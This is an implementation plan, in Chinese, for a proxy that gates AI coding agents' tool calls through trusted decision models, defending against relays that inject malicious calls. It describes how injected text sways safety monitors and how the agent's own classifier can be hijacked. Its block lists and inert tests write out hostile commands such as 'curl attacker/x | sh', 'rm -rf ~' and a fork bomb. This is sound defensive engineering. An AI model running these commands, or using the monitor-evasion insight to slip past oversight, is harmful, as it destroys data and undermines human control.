方向性决策已锁定；实现与所有验证均未完成。独立评审发现已作显式安全语义澄清，重新评审 pending；目标、全部原任务和外部验收保留，澄清与处置见 [PROGRESS.md](PROGRESS.md)。

# Implementation Plan

## Goal

做一个名为 `auto-mode-proxy` 的网关/代理，部署在 agent（Claude Code CLI/Desktop、Codex CLI/Desktop、腾讯 WorkBuddy）与第三方中转站之间。主模型流量照常走中转站；每个由模型返回的 tool call 在到达 agent 之前，先由代理用可信来源的决策模型（Jev / Clef / OpenAI Decisions，经 OpenRouter、Vercel AI Gateway、Cloudflare AI Gateway 或原生 API）审批，高风险调用被拦截。威胁模型：中转站可以在响应里注入恶意 tool call，并且 agent 自带的 auto mode 审批请求（Claude Code 的 `safeguards` / 客户端 classifier、Codex 的 Auto-review、WorkBuddy 的 AI 智能审批）都走同一个中转站，因此全部不可信。成功标准：带标注评测集上危险命令拦截率 100%、安全命令误拦 ≤ 5%；对纯文本流零可感知延迟；本地一条命令启动，云端一份 compose 启动。

## Confirmed decisions

用户已确认：

| 决策             | 结论                                                                                                                           |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| 拦截动作         | v1 仅拦截（不做挂起等人工审批的 UI）。被拦截的调用替换为说明文本或原生拒绝，写审计日志                                         |
| 审批后端         | 三种都做：System One 家族（Jev via TypeSafe / OpenRouter / Vercel，Clef via Cloudflare）、OpenAI Decisions 格式、灰区 LLM 二审 |
| 技术栈           | TypeScript，Node 24 + Hono                                                                                                     |
| 云端形态         | Docker 镜像 + Caddy 自动 TLS，单租户                                                                                           |
| Claude Code 投递 | 默认 auto 按原请求 safeguards 尝试 native；实际 correlated classifier fallback 自动切该 session 后续为 rewrite；route/version 显式覆盖，证据不足实机项 pending |
| Classifier 改道  | v1 只改道 Claude Code 的客户端 classifier 请求；Codex / WorkBuddy 的改道留二期                                                 |
| Agent 范围       | 三个都做，按 Claude Code → Codex → WorkBuddy 分阶段                                                                            |
| 凭证模型         | Vault 为主（代理持有中转站 key，agent 用代理 token）；本地 loopback 可选 passthrough                                           |

我按常规默认替用户定下的实现细节（不构成待决项）：

- 配置文件 YAML，路径 `~/.config/auto-mode-proxy/config.yaml`，支持 `${ENV}` 插值与 `--config` 覆盖。
- 默认监听 `127.0.0.1:8484`；云端容器内监听 `0.0.0.0`，但端口不发布，只有 Caddy 发布 443。
- 决策提供方按配置顺序 failover；全部不可用时 fail-closed（拦截并说明原因），可配置为 fail-open。
- 闸门模式 `enforce | shadow`，shadow 只记录不拦截，用于阈值校准。
- 审计日志 JSONL（`~/.local/state/auto-mode-proxy/audit.jsonl`，可配置），不落任何凭证，命令中的密钥先脱敏。
- 包管理用 npm，测试用 vitest，MIT 许可，README 英文 + `README.zh-CN.md`。
- 非目标（v1 不做）：人工审批 UI、多租户、Cloudflare Workers 运行时、基于 hooks 的本地集成、沙箱执行。

## Relevant codebase context

- 实际仓库为 `/root/github.com/EveGoodEvening/auto-mode-gateway`，初始提交 `ca125a8`；产品及 npm/bin 名仍为 `auto-mode-proxy`。当前只有根 `AGENTS.md` 与计划文件，无应用、依赖锁文件、测试或 CI；旧的“auto-mode-proxy 空仓库、无提交”描述已失效。
- 研究先静态发现 `~/.nvm/versions/node/v24.22.1/bin/` 下 Node/npm/npx；随后主协调者报告实际命令验证 Node v24.22.1、npm 12.2.1、Docker server 29.9.2、Docker Compose v5.6.1，因此本地容器验证可用。旧记录中的 Bun/Go/Python 版本不作为已验证前提。安装时锁定兼容 TypeScript 5.x、Node 24 类型与 eventsource-parser v3；不要盲装 registry latest（已观察 TypeScript 7 与 typescript-eslint 的 peer 范围冲突，parser latest 为 v4，tsup 9 要求 Node 24.11+）。精确依赖版本与 lockfile 由首块实施记录。
- 开发端口必须绑定 `127.0.0.1`。CLI 文件存在不等于版本、登录或实机验收通过；GUI、provider key、公开部署域名和发布权限尚待安全前提审计，未知不等于不存在。本次规划禁止 heavy/browser 工作，未运行任何检查。实施时重活须全局 heavy-gate；主协调者报告初始 MemAvailable 11523 MiB、两槽中一槽被其他会话占用，仅一槽空闲，实际执行前重新查询，绝不停止他人任务。外部验收逐项记依赖，不阻塞可离线实现部分。
- 外部协议事实（已核对官方文档/源码，实现时以此为基线）：
  - Claude Code ≥ 2.1.278 走 gateway 时在 `POST /v1/messages` 带 `safeguards: [{type:"dangerous_tool_use", classifier_context:{v:1, permission_mode, live_cwd, trusted_directories,…}}]` 与 beta 头 `dangerous-tool-use-2026-09-03`；响应顶层 `safeguard_results: [{type, status:{type:"available", tool_uses:{<tool_use_id>:{type:"evaluated", outcome:"not_flagged"|"flagged", explanation}}}}]`，流式时在最后一个 `message_delta` 的 `delta` 里。`flagged` 会被原生拒绝并回传原因，连续 3 次或累计 20 次后转人工。拿不到结果（`unsupported`）则退回客户端 classifier 请求：同一 base URL、`system` 首块以 `You are a security monitor for autonomous AI coding agents` 开头、无 `tools`、默认模型 `claude-sonnet-5`。Desktop 不读 `ANTHROPIC_BASE_URL`，需配置"第三方推理网关"。
  - Codex 0.164：仅 Responses API，自定义 provider 默认 HTTP；工具调用从 `response.output_item.done` 执行，忽略 `function_call_arguments.*`；工具为 `exec_command`（`cmd`、`sandbox_permissions`、`justification`）、`write_stdin`、自定义工具 `apply_patch`（自由文本 patch）、历史的 `shell` / `shell_command` / `local_shell_call`、MCP。请求固定 `store:false`，HTTP 下每轮回放完整 `input`。
  - WorkBuddy：自定义模型只接受 OpenAI Chat Completions 完整 URL，`Authorization: Bearer`，SSE，`tools` 由请求定义。
  - 决策模型：System One 请求 `{model, state, questions:{id:{type:noul|choice|score, instructions, criteria}}}`，响应 `answers.{id}.noul`；端点 TypeSafe `https://api.typesafe.ai/v1/systemone`、OpenRouter `https://openrouter.ai/api/v1/systemone` 与 `/api/alpha/decisions`、Vercel `https://ai-gateway.vercel.sh/typesafe/v1/systemone`、Cloudflare `https://api.cloudflare.com/client/v4/accounts/{id}/ai/run/@cf/cloudflare/clef[-flash]`（头 `cf-aig-gateway-id`）。OpenAI Decisions 请求 `{model, input, questions:[{type:predicate|choice|score, name, instructions, choices|levels}]}`，端点 Vercel `/v1/decisions`、OpenAI 原生 `/v1/decisions`。
  - 可信 LLM 端点（二审与改道）：OpenRouter `/api/v1/messages`（模型 `anthropic/claude-haiku-5.5`，必须 `provider:{only:["anthropic"],allow_fallbacks:false}`）、Vercel `/v1/messages`（`providerOptions.gateway.only:["anthropic"]`）、Cloudflare `.../anthropic/v1/messages`（裸模型 ID，`cf-aig-authorization`）。

## Recommended approach

**整体结构**（单进程，Hono on Node）：

```
agent ──HTTP──▶ ingress(route by prefix/path) ──▶ auth(vault|passthrough)
      ◀─SSE──  stream interceptor ◀─────────────── upstream relay
                    │ pure/earlier text/thinking: 直通；首个扣留 tool 后的有状态内容有界保序
                    │ tool call + ordered suffix: 缓冲 → 全轮 ID/Gate → 按源序投递
                    ▼
   Gate = normalize → redact → rules(allow|deny|review) → decision chain → threshold → verdict
   投递 = CC native safeguard_results | rewrite(替换为文本) | shadow(仅记录)
   旁路 = CC classifier 请求指纹匹配 → 改道可信 Anthropic 兼容 provider
```

**方案比较与取舍**

| 方案                                           | 覆盖                                        | 对中转站注入的防御                           | 成本            | 结论                                       |
| ---------------------------------------------- | ------------------------------------------- | -------------------------------------------- | --------------- | ------------------------------------------ |
| A. 响应侧 tool call 闸门（本方案核心）         | 三个 agent、任意权限模式                    | 直接拦截注入的调用                           | 每次 ≈ $0.00003 | 采用                                       |
| B. 只改道 agent 自带 classifier 到可信 LLM     | 仅 Claude Code 客户端 classifier 存在时     | 间接；服务端 `safeguards` 路径仍被中转站控制 | Sonnet 级 token | 作为 A 的补充（仅 CC）                     |
| C. 本地 hooks（PreToolUse）调 Jev              | CC / Codex 有 hooks，WorkBuddy 无           | 可行，但每个 agent 单独装                    | 低              | 非目标，二期可选                           |
| 投递：原生 `safeguard_results` vs 改写         | CC 专属 vs 通用                             | 同等                                         | 同等            | CC 用原生 + 退回改写；Codex/WorkBuddy 改写 |
| 决策格式：System One 一个 adapter 覆盖四条路径 | TypeSafe / OpenRouter / Vercel / Cloudflare |                                              |                 | 一个 adapter + Cloudflare 响应信封解包     |

**闸门策略（policy pack，常量集中在一个模块便于审计）**

1. 确定性规则先行（不调模型）：
   - 顺序固定为硬拒绝 → 敏感路径检查 → 非敏感只读/管理工具及泛化 `Action.kind=other` 直接放行 → 其余 review；敏感命中不得被后续白名单或 other 覆盖。敏感读取优先是落实原 P2-3 `cat ~/.ssh/id_rsa` 必须 review 的既有验收，不是新增未知工具一律审查策略：`cat .env`、`cat ~/.ssh/id_rsa` 和原生 Read/Grep/Glob 的敏感路径都必须 review。
   - 硬拒绝：`rm -rf /`、`rm -rf ~`、`mkfs`、`dd of=/dev/*`、fork bomb、`chmod -R 777 /`、写 `~/.ssh/authorized_keys`、`curl|sh` / `wget|bash` 等明确模式。
   - 敏感路径进入 review：项目目录外写入；`.ssh/id_*`、项目内的 `.claude/settings*`、`.claude/hooks`、`.codex/`、`.git/hooks/*`、`.github/workflows/*`、`package.json` scripts、`.env*`、`*.pem`、`*.key`（包含读操作）。只读 shell 用 `shell-quote` 分词，仅全部管道段在只读集合且无重定向、替换、sudo/eval/xargs/sh -c/find -delete/-exec 等时可豁免。Read/Glob/Grep/LS 仅非敏感且上下文足够时豁免；保留 TodoWrite/Task 豁免及原 P2-1/P2-7 的泛化 other（含显式 `tool_map: other`）直接 allow。归一化必须提取可见 command/path；执行线索或不可解析执行输入不能因工具名未知或 other 映射而被抹掉，应归一为相应待审动作，无法形成可用执行上下文则 block。
   - 发给模型前脱敏：API key、token、密码、私钥块、连接串。
2. 灰区交给决策模型。state 为 JSON 对象 `{action:{tool, command|path+content_excerpt|url, workdir}, environment:{platform, project_dir, trusted_directories, git_branch}, user_request:<最后一条用户消息，截断>}`。不放助手文本、不放 tool result、不放 Codex 的 `justification`（它们是模型/中转站可控文本，JevAdvBench 显示附加"已批准"类文本可翻转约 10% 判定）。
   写内容最多向 state 提供完整 UTF-8 2 KiB；超限保留 excerpt 并显式 `content_truncated:true`，直接 block，不凭模型或缓存摘要批准未见后缀（不受 provider fail-open 配置影响）。本地全内容摘要只用于身份隔离，不是语义证据。
3. 六个正交 noul 问题（均正向措辞，带 true/false criteria）：`destructive`、`exfiltration`、`remote_code_exec`、`security_weakening`、`outside_scope`、`matches_user_request`。
4. 阈值（以 CHECKLIST Locked decisions 为准，默认可配置）：前四项任一 ≥ 0.70 → 拦截；`matches_user_request` ≤ 0.30 且任一前四项 ≥ 0.50 → 直接拦截；全部前四项 ≤ 0.30 且 `outside_scope` ≤ 0.50 → 放行；其余为灰区 → 走 LLM 二审。边界、优先级及二审故障行为见 PROGRESS 的评审决策；尚无二审时不把灰区当作 provider 成功放行。
5. 决策提供方链：按配置顺序 failover（例如 `jev-openrouter → clef-flash-cloudflare → luna-vercel`），每个超时 5 s，429/529 重试一次；全链失败 → fail-closed。
6. 判定缓存：保留 CHECKLIST 的规范化动作、policy 版本、chain id、TTL 600 s 和 LRU 上限 10000；键还必须绑定实际决策 state（用户请求、项目/可信目录、workdir、平台等）与生效策略/provider/二审配置指纹，避免跨上下文复用 allow。原始密钥不进键材料、日志或审计；故障结果不作为成功 allow 缓存。详见 PROGRESS 评审与反例测试要求。

**投递语义**

- Claude Code，原请求带 safeguards 且 selector 选 native：代理默认剥转发 safeguards 与危险 beta，enforce 始终丢弃任何上游 safeguard_results；全轮 ID 唯一性确认后，在最后 message_delta 注入代理结果，block=flagged+问题名/概率 explanation，provider 不可用=flagged+说明；非流式顶层注入。selector 选 rewrite 则走下一条改写语义。
- 其他情况（Claude Code 无 `safeguards`、Codex、WorkBuddy）：改写。Anthropic 格式把该 `tool_use` 块替换为同 index 的 `text` 块，若无剩余 tool_use 则 `stop_reason` 改为 `end_turn`。Responses 格式扣留执行项的完整生命周期，在原位置替换为 `message` 完整输出链，并同步修正 `response.completed/incomplete.output[]`。Chat Completions 格式按 `index` 聚合 `delta.tool_calls`，拦截时丢弃该调用、补发 `delta.content` 说明，`finish_reason` 改为 `stop`。
- 并行多个 tool call 逐个判定；各协议可在单项完成时开始判定，但所有执行事件须扣留至全轮 ID 唯一性确认，再按原顺序放出允许项。Anthropic enforce 的 C08 ordered-content barrier 与 Responses enforce 的下述 C10 修订采用相同单向有界后缀语义：纯文本与首个扣留 execution 之前的文本/thinking/reasoning 立即直通，之后的有状态内容不得越过 execution；不再承诺混合轮次后缀文本零等待。只有真正 control-only 的 ping/comment/error 可即时发送，携带 output 的快照不是 control。shadow 原字节/非阻塞不变；不扩展 C11 Chat 契约或引入跨协议新抽象。
- 流式/非流式响应均检查 tool ID 唯一性；碰撞（包括混合 verdict）使整轮所有执行调用 fail-closed，并取消上游，不生成碰撞的 native 结果映射。native 路径也必须扣留执行块直到全轮 ID 唯一性确认，不能在检测前泄露调用。
- 缓冲硬界限（所有协议）：单调用 1 MiB、单响应累计所有扣留帧/参数/终态/有序后缀/兼容 reasoning 8 MiB，其中 thinking/reasoning 合计 ≤4 MiB（有序后缀内同样适用，不仅 compat 模式）；SSE 未闭合帧 ≤1 MiB。收到首个执行块或兼容 reasoning 开始计时，60 s 内须完整闭合；上游连续无字节 30 s 超时（代理 ping 不重置），判定链另有全轮 60 s 截止。超限、超时、EOF 未闭合均 block 整轮未投递执行、取消上游、终止响应，不发允许/执行事件；非流式拦截响应体也受 8 MiB 界限及 thinking/reasoning 子集界限约束。使用假时钟/超大 fixture 验证，不等待真实超时。
- 自动 native fallback：route `claude_delivery: auto|native|rewrite` 默认 auto；route 显式 native/rewrite 优先，其次 `claude_delivery_by_version` 精确版本覆盖，其次 scoped auto。auto 在原请求有 safeguards 且无已知不支持证据时仍尝试 native（未知版本不擅自默认为 rewrite）；无 safeguards 改写。已发 native 后，同一客户端认证身份 + route + 明确 session header + 实测 agent version 的下一请求，若匹配既定 classifier 指纹且发生在该 session 最近 native 响应后 30 s 内、无中间模型轮次，作为客户端 fallback 可观察信号，改道该 classifier 并将该 scoped session 后续请求自动切为 rewrite。最多跟踪 1024 session，闲置 30 min 过期；无可靠 session/version、不相关 classifier 或仅 /status/计费文字不触发降级。passthrough 用本地不可逆凭证身份指纹隔离、绝不存原凭证。缺失身份则不自动推断。不推断虚构 acknowledgement，不重放已发工具；fixture 验证关联/隔离/过期/override，并以真实 fallback 轨迹验证；无实机证据 P3-4 pending。
- 投递 selector 的前置条件是原请求确实带 safeguards；无该字段始终 rewrite，route/version native 不能伪造客户端 opt-in。auto fallback 只更新本地 scoped evidence，不自行写全局版本覆盖表；版本覆盖必须有人工记录的实测证据。正常请求/结果不得作为能力确认信号。

**C08 定向契约修订：Anthropic 有序内容屏障（定向计划评审 CLEAN，6f71ebc 前已批准；修复已应用于 69c130b，计划批准不等于运行验收）**

- 事实依据：实际 Claude Code 2.1.311 的 artifact295 严格 mixed 回放失败；artifact303 第 2 行完整诊断表明代理先发送 index1 text start/delta/stop，后发送被扣留的 index0 tool（native）或 index0 拒绝文本（rewrite）。立即下一请求的同一个 assistant message 中分别为 `[marker text, exact original Bash tool]`、`[marker text, exact proxy denial text]`；无相关截断/省略和 parser error。native 的 per-ID flagged/代理 explanation 已捕获，相关 user `tool_result.is_error` 与返回原因证据仍在。三次调用全被拒绝、零成功：这是内容顺序/历史语义回归，不是执行绕过，也不是可接受的相邻同角色 message 序列化拆分。不能放宽观察器把反序当成功。
- 原契约“文本/thinking 永不缓冲”与“native 历史不变”在合法 tool0→text1 布局上不能同时成立；客户端实测按到达顺序构造 replay，index 不足以救回原序。选择最小正确修订：仅在 enforce 收到首个被扣留 tool start 时开启单响应、不可提前解除的内容屏障。屏障前已合法输出的文本/thinking 不撤回；纯文本轮次完全不进入屏障，额外延迟 <5 ms 的原目标不变。屏障后的全部 content_block start/delta/stop（包括 text、thinking、redacted_thinking、signature 及未来不认识的内容块）和 message_delta/message_stop 按原到达次序进入同一有界队列；无需按类型建立第二套后缀队列，也不只扣留 start 而放过 delta/stop。保留原 index/工具 ID/输入；合法源序上不排序、不重编号、不合并或重组助手历史。
- 全轮正常闭合及现有 EOF/完整 JSON/ID 唯一性检查、全部真实判定完成后才放队列。native 仅移除伪造结果并在最终 delta 注入代理结果，原 content 顺序/内容不变；rewrite 在原 tool 的队列位置替换完整同 index text start/delta/stop，后续 marker 保持在它之后，允许的 tool 原样保序；无剩余 tool 时才改 end_turn。终态/usage 仍在内容之后，不重复计入/发送；非流式 content[] 的原位映射是相同语义的参照，不通过历史改写修复客户端。
- 旁路仅限非内容控制事件：ping、SSE comment/id/retry-only frame、上游 error 立即发送，判定等待期间既有保活继续；不得借未知 content-block 类型旁路。其他未识别的 data 事件在屏障后保守入队，避免引入未知状态反序；屏障前沿用既有处理。即时 error 不授权清空/放行队列，不替代原 fail-closed/取消语义。背压下所有输出继续串行化，客户端取消/上游故障取消 reader、判定与定时器并丢弃未放后缀，绝不靠超限提前 flush。
- 后缀 raw bytes、保留的参数/解析表示、终态与改写输出沿用同一总量账本，不另开 8 MiB，不重复复制整个队列；重编码/替换暂存同样受界限约束。队列中的 thinking/redacted_thinking/signature 相关帧及所保留表示归入 ≤4 MiB 子集，同时归入 ≤8 MiB 总量；不能把 reasoning 改名为普通 suffix 逃开子集上限。仅已释放且不再保留的早期内容不占队列预算。首 tool 完成 60 s、idle 30 s、全轮判定 60 s 及单 tool/未闭合帧 1 MiB 全不变，后续 text/ping 不重启截止；边界失败不放任何未放执行项。
- 这不是 preserved-thinking stripping 兼容模式：原始 thinking/signature 内容仍保留，只按需要等待顺序；不得因本证据启用 strip/replay 清理。既有 P3-5 有证据的选择性 stripping 分支与 R5 仍单列，若启用则共享相同屏障/总量/子集预算，不能撤回已发 thinking。shadow 继续原字节无等待观察，不为复制 enforce 屏障而延迟客户流。
- 替代方案不采用：①维持文字永直通或放宽 mixed 断言，已证实反序；②重映射 index，既不恢复到达顺序又增加身份/改写一致性风险；③发 tool start 占位后等审批，违反扣留执行与全轮 ID 安全；④逐 tool 提前释放，无法排除晚到重复 ID；⑤缓冲整轮纯文本/从 message_start 开始，一刀切损害 <5 ms 目标；⑥事后重写请求历史、强制 rewrite、特判目标版本/布局，均不能同时恢复 native 与 rewrite 的源序契约。单一 ordered suffix 队列复用已有闸门、边界与取消路径，代价明确为工具之后文本/thinking 等待，不增加配置或审批策略。
- 验收必须同时包含协议夹具、真实 HTTP 与同一 installed CLI mixed regression：tool0→marker1 的 native replay 为 exact tool 在 marker 之前且保留相关 errored result/exact proxy reason，rewrite replay 为 exact denial 在 marker 之前且无该工具/结果；立即下一请求中检查同 assistant 语义关联与 ordered block tuples，不用拼接文本偏移替代。测试早期 text→tool→后缀、多个 tool/部分 block、thinking/signature、无工具、shadow、错误/保活、慢判定/背压、同一总量与 reasoning 子集超限、EOF/重复 ID/超时/取消；对照 nonstream 的 content 顺序与 stop_reason。不得将 mock cache、纯文本性能、三次拒绝或 CLI exit0 单独当 mixed 回归成功。精确实施入口与重新验收记账见 PROGRESS 的 C08 修订。

**Classifier 改道（仅 Claude Code）**：匹配 `system` 数组中存在以 `You are a security monitor for autonomous AI coding agents` 开头的文本块且无 `tools` 的请求，换凭证转发到配置的可信 Anthropic 兼容 provider，裸模型 ID 映射为网关 slug（Cloudflare passthrough 不映射），`system` 数组（含首位 attribution 块）、`stop_sequences`、`thinking`、`cache_control` 原样保留，响应流原样回传。

**配置示例（节选）**

```yaml
listen: { host: 127.0.0.1, port: 8484 }
auth:
  mode: vault            # vault | passthrough(仅 loopback 允许)
  client_tokens: [ "${AMP_TOKEN_CC}", "${AMP_TOKEN_CODEX}" ]
routes:
  - prefix: /cc        ; protocol: anthropic-messages ; upstream: relay-a
  - prefix: /codex     ; protocol: openai-responses   ; upstream: relay-b
  - prefix: /workbuddy ; protocol: openai-chat        ; upstream: relay-b
upstreams:
  relay-a: { base_url: https://relay.example.com, api_key: "${RELAY_A_KEY}", forward_safeguards: false }
  relay-b: { base_url: https://relay2.example.com/v1, api_key: "${RELAY_B_KEY}" }
gate:
  mode: enforce          # enforce | shadow
  on_provider_failure: block
decision:
  chain: [jev-openrouter, clef-cf, luna-vercel]
  providers:
    jev-openrouter: { kind: systemone, base_url: https://openrouter.ai/api/v1, api_key: "${OPENROUTER_API_KEY}", model: typesafe/jev-1.14 }
    clef-cf:        { kind: systemone, base_url: https://api.cloudflare.com/client/v4/accounts/${CF_ACCOUNT_ID}/ai/run/@cf/cloudflare/clef-flash, api_key: "${CF_API_TOKEN}", headers: { cf-aig-gateway-id: default }, model: clef-flash, envelope: cloudflare }
    luna-vercel:    { kind: openai-decisions, base_url: https://ai-gateway.vercel.sh/v1, api_key: "${AI_GATEWAY_API_KEY}", model: openai/gpt-6-luna-decisions }
  second_stage: { kind: anthropic-messages, base_url: https://openrouter.ai/api/v1, api_key: "${OPENROUTER_API_KEY}", model: anthropic/claude-haiku-5.5, pin: { provider: { only: [anthropic], allow_fallbacks: false } } }
classifier_reroute: { enabled: true, provider: second_stage }
```

## Implementation steps

**Phase 0：脚手架**
1. 初始化 npm 项目（TypeScript 5、`hono`、`@hono/node-server`、`zod`、`yaml`、`pino`、`eventsource-parser`、`shell-quote`、`partial-json`、`vitest`、`tsx`、`tsup`）。目录：`src/{cli,server,routes,auth,protocols,gate,decision,policy,audit,config}`、`eval/`、`docs/`、`deploy/`。
2. `src/config`：zod schema + YAML 加载 + `${ENV}` 插值 + 校验错误提示；`auto-mode-proxy check` 校验配置并对每个决策提供方发一个固定 canary 问题。
3. CLI 骨架：`init`（交互式生成配置、签发 token、打印三种 agent 的接入片段）、`serve`、`check`、`eval`、`audit tail`、`token new`。

**Phase 1：直通代理与 Anthropic Messages 适配器**
4. 路由：按 `prefix` 匹配 route，无前缀时按路径推断协议（`/v1/messages*` → anthropic，`/v1/responses` → responses，`/v1/chat/completions` → chat）；未知路径对该 upstream 字节级直通。
5. 认证：vault 模式校验客户端 token（常量时间比较），转发时替换 `Authorization` / `x-api-key` 为 upstream 凭证；passthrough 模式仅当监听地址为 loopback 时允许，否则启动失败。转发保留除 hop-by-hop 外全部头（含 `anthropic-version`、`anthropic-beta`、`x-claude-code-*`），响应头原样回传（`retry-after`、限流头），错误体不改写。
6. 请求体：仅解析不修改时按原字节转发；需要修改（剥 `safeguards`、改道换模型）才重新序列化。
7. SSE 拦截器：原始 frame 字节保留（含 CRLF/comment/id/retry/多行 data），解析旁路供语义使用，仅改写事件重新编码；ping 直通。tool_use 从 start 到 stop 私有缓冲，完整 JSON.parse 后审批；Anthropic enforce 首个扣留 tool 后按上述有序内容屏障扣留有状态后缀，纯/早期文本立即直通；partial-json 只供诊断，不把未完整输入判 allow；超限/截止/EOF 按投递语义 fail-closed。
8. 验证：录制 fixture（文本、thinking、单/多 tool_use、ping、错误事件）做单元测试；用 mock upstream 跑 Claude Code 实机会话，确认直通时行为与无代理一致（含 prompt cache 命中，看 `cache_read_input_tokens` 不为 0）。

**Phase 2：闸门引擎与 System One 适配器**
9. `src/gate/normalize`：把三种协议的 tool call 归一化为 `Action{kind: command|file_write|url|mcp|other, tool, argv/text, paths, workdir, raw}`；Claude Code 工具名映射表；Codex 的 `exec_command/shell/shell_command/local_shell_call/write_stdin/apply_patch`（解析 `*** Add/Update/Delete File:` 得到路径）；WorkBuddy 按 route 的 `tool_map` 加启发式（工具名/描述含 shell/command/terminal/execute；参数含 path+content 视为写文件）。
10. `src/policy`：只读白名单、硬拒绝、敏感路径、脱敏，全部为纯函数并有表驱动测试；policy 带 `version` 字段参与缓存键。
11. `src/decision/systemone`：构造 state 与六个 noul 问题；适配 TypeSafe / OpenRouter / Vercel / Cloudflare 四种 URL、鉴权头、模型名与 Cloudflare `{result,success,errors}` 信封；超时、重试、429/529 处理；返回统一 `Answers`。
12. `src/gate/decide`：规则 → 缓存 → 决策链 → 阈值真值表 → `Verdict{allow|block|uncertain, reasons, probabilities, provider, latency, cost}`；`uncertain` 在 Phase 4 前按 block 处理。
13. `src/audit`：JSONL 追加写（含 route、协议、会话头、脱敏后的动作、规则命中、各问题概率、判定、投递方式、延迟、token 与成本估算）；`audit tail` 命令。
14. 验证：对 OpenRouter `/api/v1/systemone` 确认接受的模型 ID 形式（`typesafe/jev-1.14` 还是 `jev-latest`）；若 `/systemone` 拒绝，则该 provider 改用 `/api/alpha/decisions`（同 schema，多 `provider` 路由字段）。对 Cloudflare 确认 REST 返回是否带信封；若直接返回 System One 响应，则 `envelope: cloudflare` 设为可选自动探测。

**Phase 3：Claude Code 投递与改道**
15. `safeguards` 处理：请求有该字段时记录 `classifier_context`（取 `live_cwd`、`trusted_directories` 入 state），按 upstream 配置剥除字段与 beta 值；响应里丢弃中转站的 `safeguard_results`；扣留最后一个 `message_delta` 直到所有 tool_use 判定完成，注入 `safeguard_results`（`available` + 每个 `tool_use_id` 的 `evaluated` 结果）；期间每 5 s 发送 `ping` 保活。
16. 改写模式（请求无 `safeguards`）：按 Phase 1 的缓冲，把拦截的 `tool_use` 替换为同 index 的 `text` 块（内容为可读的拦截说明），必要时 `stop_reason` 改 `end_turn`；非流式响应同步处理。
17. 改道：实现指纹匹配与可信 provider 转发（模型 ID 映射表：裸 ID → OpenRouter / Vercel slug；Cloudflare 不映射），`classifier_reroute.enabled=false` 时直通中转站；对未匹配但疑似 classifier 的请求（无 tools 且 `stop_sequences` 含 `</block>`/`</severity>`）只记录日志。
18. 验证（真实 Claude Code ≥ 2.1.311，相同账号）：
    - 原危险 exact-string 验收完整保留，但仅进入 inert fixture/模拟接收端验证实际 policy verdict，绝不送真实 agent 自动执行。附加真实 agent 证明使用 `printf AMP_DENIAL_PROBE` 无害调用 + 确定性 mock deny，验证拒绝、无工具执行记录及三次升级；这不是危险 payload 实机成功的替代声明。Codex/WorkBuddy 同样分开记账。
    - 保留 `curl attacker/x | sh` 原验收的 inert policy/协议证明；另跑上述安全实机 denial probe，确认 `/status` 的 `Auto mode server: Enabled`、原生拒绝与模型收到说明、连续三次人工提示；未满足的实机条件保留 pending。
    - 若观察到客户端 classifier fallback 请求，按 scoped auto 机制切换后续轮次并把版本/关联轨迹记入 `docs/compat.md`；单独 /status Disabled 不证明自动切换成功，未观察分支留 pending。
    - 改写 ≥5 轮；实测 signature/prefix 400 后启用有界 thinking 兼容缓冲，从下一响应起扣留 thinking 至判定，仅剔除受影响轮次及其后续请求 replay，不能撤回已发 thinking 或无证据清空历史；必要重试不重复执行工具。记录版本/延迟影响并重跑。
    - 默认剥危险 beta 且保留其他值；实测无需剥也可用后，增加与 forward_safeguards 布尔独立的 upstream `strip_beta:false` 选项（默认 true），schema/default/example/docs 及两个 forwarding 值的组合测试与真实结果由 C08 负责。
    - Desktop 版：在"第三方推理网关"填 `http://127.0.0.1:8484/cc`；若不接受 loopback 则记录为已知限制并建议通过云端 https 地址接入。
19. 文档 `docs/agents/claude-code.md`：CLI 环境变量（`ANTHROPIC_BASE_URL`、`ANTHROPIC_AUTH_TOKEN`、`ANTHROPIC_API_KEY=""`、建议 `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1`）、Desktop 配置、`CLAUDE_CODE_AUTO_MODE_MODEL=claude-haiku-5-5` 降低改道成本的提示。

**Phase 4：OpenAI Decisions 适配器与 LLM 二审**
20. `src/decision/openai-decisions`：同一问题集映射为 `predicate` 数组请求，适配 Vercel `/v1/decisions` 与 OpenAI 原生；响应 `answers[]` 按 `name` 回填为统一 `Answers`。
21. `src/decision/llm-review`：Anthropic Messages 请求（Haiku 5.5，`output_config.format` JSON schema 输出 `{verdict, reason}`），输入为 state JSON 与一阶段概率，带网关 pin 参数；若该网关拒绝 `output_config.format`，退回"指令要求仅输出 JSON + 严格解析，解析失败视为 block"。
22. 把 `uncertain` 接入二审；审计记录两阶段成本。

**Phase 5：Codex（OpenAI Responses）适配器**
23. SSE 拦截：维护 output_index → item，缓冲 function/custom/local_shell 执行项；arguments.delta 早期分析但只在 output_item.done 对完整动作判定，直到全轮 ID 唯一性检查后才发允许项。首个 execution 起使用下述单向有界 ordered suffix，后续文本/reasoning/生命周期/终态不得越过它。拦截原位替换 message 完整事件链，同步 completed/incomplete output[] 与单调 sequence_number、保留 usage；非流式同理，资源/截止见投递语义。
24. 验证（真实 Codex CLI 与桌面版，共用 config.toml）：原 `exec_command{cmd:"rm -rf ~", sandbox_permissions:"require_escalated"}` exact-string 的 policy/改写证明仅在 inert mock 接收端完成；额外以安全 denial probe 在 `--yolo` 与 `Approve for me` 两种模式确认真实拒绝，绝不尝试真实破坏执行。下一轮带回放 `input` 不应被上游拒绝；如实测 reasoning 一致性错误，启用有界兼容缓冲及该轮 reasoning/replay 去除。
25. 文档 `docs/agents/codex.md`：`[model_providers.amp]`（`base_url=http://127.0.0.1:8484/codex/v1`、`env_key`、`wire_api="responses"`、`supports_websockets=false`）与 `model_provider="amp"`。

**C10 定向 ordering/latency 契约修订 — targeted PLAN REVIEW CLEAN / prior approval for repair（父代理 plan-only commit 仍为修复前置）**

- 范围与前置：这是 CLOSED LOCAL C09 `638f676` 后现有 C10 内的定向修订，不新建计划/chunk。原 P5-1/2/3、P3-6 Responses 扩展、全部验收数量/模式/真实上游条件保持。父代理仅编排；独立 `agent://C10OrderingContractReview` 已对三份规划给出 CLEAN，构成定向修复的事先计划批准；父代理仍须先仅提交这三份批准计划，随后才可解除生产顺序修复 HOLD。已有草稿/本地实现不是批准、验证或验收证据；当前 1721-test 是 C09 已观察基线，不是 C10 已通过数量。C08 native 严格失败及原外部 canary 不变。
